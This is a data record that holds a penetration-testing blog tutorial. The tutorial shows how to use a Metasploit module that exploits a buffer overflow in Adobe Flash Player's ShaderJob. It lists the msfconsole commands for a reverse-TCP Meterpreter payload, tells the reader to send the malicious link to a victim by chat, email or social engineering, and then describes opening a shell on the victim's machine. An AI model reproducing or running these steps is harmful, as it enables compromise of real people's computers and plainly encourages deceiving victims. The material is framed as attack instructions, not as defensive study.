description = "This module exploits a buffer overflow vulnerability related to the ShaderJob workings on Adobe Flash Player. The vulnerability happens when trying to apply a Shader"
full_description = "Kali Linux, Penetration Testing Exploit Remote PC using Adobe Flash Player ShaderJob Buffer Overflow July 4, 2015 by Raj This module exploits a buffer overflow vulnerability related to the ShaderJob workings on Adobe Flash Player. The vulnerability happens when trying to apply a Shader setting up the same Bitmap object as src and destination of the ShaderJob. Modifying the “width” attribute of the ShaderJob after starting the job it’s possible to create a buffer overflow condition where the size of the destination buffer and the length of the copy are controlled. This module has been tested successfully on: Windows 7 SP1 (32-bit), IE11 and Adobe Flash 17.0.0.169, Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 17.0.0.169, Windows 8.1, Firefox 38.0.5 and Adobe Flash 17.0.0.169, and Linux Mint “Rebecca” (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.457. Exploit Targets Windows 7 Firefox 38.0.5 Adobe Flash 17.0.0.169 Requirement Attacker: kali Linux Victim PC: Windows 7 Open Kali terminal type msfconsole Now type use exploit/multi/windows/browser/adobe_flash_shader_job_overflow msf exploit (adobe_flash_shader_job_overflow)>set payload windows/meterpreter/reverse_tcp msf exploit (adobe_flash_shader_job_overflow)>set lhost 192.168.0.160 (IP of Local Host) msf exploit (adobe_flash_shader_job_overflow)>set srvhost 192.168.0.160 msf exploit (adobe_flash_shader_job_overflow)>set uripath / msf exploit (adobe_flash_shader_job_overflow)>exploit Now an URL you should give to your victim http://192.168.0.160:8080 Send the link of the server to the victim via chat or email or any social engineering technique Now when the victim opens the following link (http://192.168.0.160:8080) a session will be opened as shown below Now type session –l to display sessions opened when the victim opens the link Now the session has opened type sysinfo to get system information, then type shell to enter into Victims command prompt. Post navigation Best of Computer Forensics TutorialsHow to Clone Drive for Forensics Purpose"
